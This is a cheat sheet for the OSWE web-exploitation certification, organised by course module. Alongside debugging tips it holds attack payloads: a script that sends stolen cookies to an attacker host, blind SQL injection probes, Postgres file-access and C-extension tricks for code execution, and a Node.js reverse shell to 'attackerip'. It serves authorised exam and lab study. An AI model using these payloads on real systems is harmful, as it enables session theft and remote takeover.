# OSWE-cheat-sheet
OSWE-cheat sheet module by module with updated syllabus:

Module : Atmail (PHP):

1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
    <script>alert(document.cookie);</script>
    
2. Run Python Server in python3<br>
    python3 -m http.server
    
3. Embeded cookie steal payload in image tag<br>
    function addImage() {<br>
    var img = document.createElement('img');<br>
    img.src = 'http://AttackerIP:port/' + document.cookie;<br>
    document.body.appendChild(img);<br>
    }<br>
    addImage();<br>
    
4. Set cookie by web developer console<br>
    javascript:void(document.cookie="cookiename=value");
 
5. XHR POST Request <br>
    xhr= new XMLHttpRequest()<br>
    xhr.open("POST", url, true)<br>
    xhr.send(data)<br>
    
6. XHR GET Request <br>
    xhr= new XMLHttpRequest()<br>
    xhr.open("GET", url, true)<br>
    xhr.send()<br>

 Module : ATutor Authentication Bypass and RCE (PHP) :<br>
 1. Enable MySQL DB logging<br>
    nano /etc/mysql/my.cnf         // uncomment or add below line<br>
            [mysqld]<br>
            general_log_file = /var/log/mysql/mysql.log<br>
            general_log = 1<br>
    systemctl restart mysql        //Restart MySQL<br>
    tail –f /var/log/mysql/mysql.log   //Access MySQL Log<br>
    
 2. Enable PHP verbose error<br>
    nano /etc/php5/apache2/php.ini   //uncomment or add below line<br>
        #display_errors = On <br>
    systemctl restart apache2     //Restart Apache<br>
    
3. Print statement in PHP<br>
    echo "any message";<br>
    
4. Dump information about varaible<br>
    var_dump($var);<br>
    
5. Serach for fiunction in code<br>
    grep -rnw "function name(" ./ --color<br>
    
5. Check magic quote enable<br>
    var_dump(get_magic_quotes_gpc());  /** for enable value is 1 **/<br>
    
6. MYSQL query without space<br>
    mysql> select/**/1; <br>
    
7. Extract first character of MySql version in case of blind MySQL query<br>
    mysql> select ascii(substring((select version()),1,1))=53;  /** use with "or" boolean **/<br>
    
8. Create ZIp file using Python2 <br>
    !/usr/bin/python <br>
    import zipfile <br>
    from cStringIO import StringIO<br>

    def build_zip():<br>
        f = StringIO()<br>
        z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)<br>
        z.writestr('folder/file.txt', 'secret')<br>
        z.close()<br>
        zip = open('zip.zip','wb')<br>
        print f.getvalue()<br>
        zip.write(f.getvalue())<br>
        zip.close()<br>
    
    build_zip()<br>

Module : PHP Type Juggling Vulnerability : 
1.  Configure SMTP Server<br>
    sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25 & /* & for run in background */<br>
    
Module : ManageEngine Application Manager AMUserResourcesSyncServlet SQL(Postgres) Injection & RCE : <br>
1.  web.xml determine how URLs mapped<br>
2.  Tool JD-GUI use to decompile java<br>
3.  Find SQL injection vulnerability using below regular expression<br>
        ^.*?query.*?select.*?<br>
4.  Enable postgres logging by uncommenting below line in postgresql.conf file<br>
        log_statement = 'all'<br>
5.  postgre cli
        psql -U username -p 15432  /* p=port, /<br>
6.  Alternative of single quote(') is duble doller sign($$)<br>
7.  decode string in postgres<br>
        select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');<br>
8.  Using CHR and String Concatenation<br>
        SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);<br>
9.  Accessing the File System in postgres<br>
        COPY <table_name> from <file_name><br>
        COPY <table_name> to <file_name><br>
10. PostgreSQL Extensions<br>
        CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
        
Module : The Bassmaster Plugin (Nodejs) : 
1. JavaScript reverse shell
     var net = require("net"), sh = require("child_process").exec("/bin/bash");
     var client = new net.Socket();
     client.connect(53, "attackerip",
     function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
     sh.stderr.pipe(client);});

    
